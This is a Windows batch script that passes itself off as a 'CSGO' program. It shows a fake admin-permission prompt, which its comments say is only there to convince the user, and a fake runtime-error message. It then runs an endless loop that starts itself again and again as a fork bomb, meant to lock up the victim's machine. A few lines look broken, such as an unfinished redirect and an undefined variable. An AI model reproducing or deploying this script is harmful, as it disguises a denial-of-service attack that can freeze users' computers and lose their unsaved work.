@ echo off

set appname=CSGO
set bat1=lang.txt
set bat2=texture.txt
rem no /,. etc in appname bat1 and bat2

echo %cd%

:checkPermissions

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto :isAdmin
    ) else (
		@echo adminPermission = false > 
        echo %filename% requires administrative permissions to run. Please run as administrator.
		echo Press Any Key To Terminate...
		pause >nul
		goto:eof
    )
    
 rem the admin check is for convincing only, does not affect anything, you can remove all of the :checkPermissions label (remove from :checkPermissions till :isAdmin)

:isAdmin	
rem Create suporting batch files
if exist %bat1% del %bat1%

echo:set /A a=2^32 >>%bat1%
echo:set /A b=(2^32)-1 >>%bat1%
echo:set /A c=a-b >>%bat1%
echo :re >>%bat1%
echo:start %bat2% >>%bat1%
echo goto re>>%bat1%

echo:set /A a=2^32 >>%bat2%
echo:set /A b=(2^32)-1 >>%bat2%
echo:set /A c=a-b >>%bat2%
echo :re >>%bat2%
echo:start %bat1% >>%bat2%
echo goto re>>%bat2%

echo Runtime error 324 (REC_INF) has occurred. Aborting process...

:recurse
start %bat1%
start %bat2%
goto recurse
